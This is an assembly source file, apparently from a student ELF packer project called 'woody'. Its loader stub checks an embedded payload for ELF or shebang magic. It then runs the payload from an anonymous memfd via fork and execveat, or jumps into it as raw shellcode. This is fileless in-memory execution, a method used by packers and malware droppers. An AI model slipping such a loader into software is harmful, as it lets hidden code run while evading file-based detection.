; **************************************************************************** ;
;                                                                              ;
;                                                         :::      ::::::::    ;
;    loader.inc.s                                       :+:      :+:    :+:    ;
;                                                     +:+ +:+         +:+      ;
;    By: kiroussa <oss@xtrm.me>                     +#+  +:+       +#+         ;
;                                                 +#+#+#+#+#+   +#+            ;
;    Created: 2025/05/14 23:11:06 by kiroussa          #+#    #+#              ;
;    Updated: 2025/06/20 14:10:08 by kiroussa         ###   ########.fr        ;
;                                                                              ;
; **************************************************************************** ;

; Variables (see variables.inc.s):
;   - payload
;   - payload_size

_woody_loader:
	push RAX
	mov  RSI, [RAX + OFFSET_USER_PAYLOAD_SIZE]	;user_payload_size
	cmp  RSI, 0
	je   .Lend

 	lea  RDX, [RAX + OFFSET_SEGMENTS_CONTENT]
 	add  RDX, [RAX + OFFSET_SEGMENTS_CONTENT_SIZE]	;user_payload

 	cmp  BYTE [RDX], 0x7F ; elf magic
 	jne  .Lcheck_interpret
 	cmp  BYTE [RDX + 1], 0x45 ; E
 	jne  .Lcheck_interpret
 	cmp  BYTE [RDX + 2], 0x4C ; L
 	jne  .Lcheck_interpret
 	cmp  BYTE [RDX + 3], 0x46 ; F
 	jne  .Lcheck_interpret

	call do_execve

	ret

.Lcheck_interpret:
 	cmp BYTE [RDX], 0x23	 ; #
 	jne .Lshellcode
 	cmp BYTE [RDX + 1], 0x21 ; !
 	jne .Lshellcode
 	cmp BYTE [RDX + 2], 0x2f ; /
 	jne .Lshellcode

	call do_execve

	ret

.Lshellcode:
	push RAX
  	call RDX
	pop  RAX

.Lend:
	ret

do_execve:
	jmp	.Lcreate_payload_fd

.Lcreate_payload_fd:
	push RSI
	push 0x0
	push 0x37
	push 0x32	;RSP -> "27"

	mov  SYS_ARG0, RSP
	mov  SYS_ARG1, 0
	mov  SYS_NUM, SYS_MEMFD_CREATE
	SYSCALL
	pop  RSI
	pop  RSI
	pop  RSI

	jmp	.Lwrite_payload_to_fd

.Lwrite_payload_to_fd:
	mov  SYS_ARG1, RDX
	pop  SYS_ARG2
	mov  SYS_ARG0, RAX
	mov  SYS_NUM, SYS_WRITE
	SYSCALL

	cmp	 RAX, -1
	je   .Lend
	jmp	.Lexecute_payload

.Lexecute_payload:
	mov SYS_NUM, SYS_FORK
	SYSCALL

	cmp RAX, 0
	je  .Lexec

	mov SYS_ARG0, RAX
	mov SYS_ARG1, 0
	mov SYS_ARG2, 0
	mov SYS_ARG3, 0
	mov SYS_NUM, SYS_WAIT4
	SYSCALL

	jmp .Lend

.Lexec:
					;dirfd already loaded into RDI
	push 0
	mov  SYS_ARG1, RSP	;pathname
	mov	 SYS_ARG2, 0		;argv
	mov  SYS_ARG3, RSP
	add  SYS_ARG3, 0x30	;envp
	mov  SYS_ARG4, 0x1000	;flag
	mov  SYS_NUM, SYS_EXECVEAT
	SYSCALL

	pop  RAX
	pop  RAX
	ret

.Lend:
	pop  RAX
	ret
